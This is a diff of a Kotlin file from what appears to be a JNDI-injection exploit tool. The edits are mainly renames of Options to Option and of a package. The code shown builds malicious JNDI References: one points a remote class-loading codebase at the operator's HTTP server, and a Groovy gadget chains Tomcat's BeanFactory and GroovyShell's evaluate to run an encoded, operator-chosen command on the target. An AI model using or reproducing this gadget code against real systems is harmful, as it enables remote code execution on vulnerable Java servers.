@@ -1,8 +1,10 @@
+@file:JvmName("gadgets")
+
 package rmi
 
-import http.PayloadGenerator
+import payload.PayloadGenerator
 import org.apache.naming.ResourceRef
-import util.Options
+import util.Option
 import util.base46cmd
 import util.toBase64
 import java.net.URL
@@ -10,7 +12,7 @@ import javax.naming.Reference
 import javax.naming.StringRefAddr
 
 fun RMIServer.ref(mapping: String): Reference {
-    val codebase = URL("http://${Options.address}:${Options.httpPort}/")
+    val codebase = URL("http://${Option.address}:${Option.httpPort}/")
     return Reference("foo", mapping, "$codebase#$mapping")
 }
 
@@ -54,6 +56,6 @@ fun RMIServer.groovy() =
         "groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null
     ).apply {
         add(StringRefAddr("forceString", "x=evaluate"))
-        add(StringRefAddr("x", "'${base46cmd(Options.command)}'.execute()"))
+        add(StringRefAddr("x", "'${base46cmd(Option.command)}'.execute()"))
     }
 
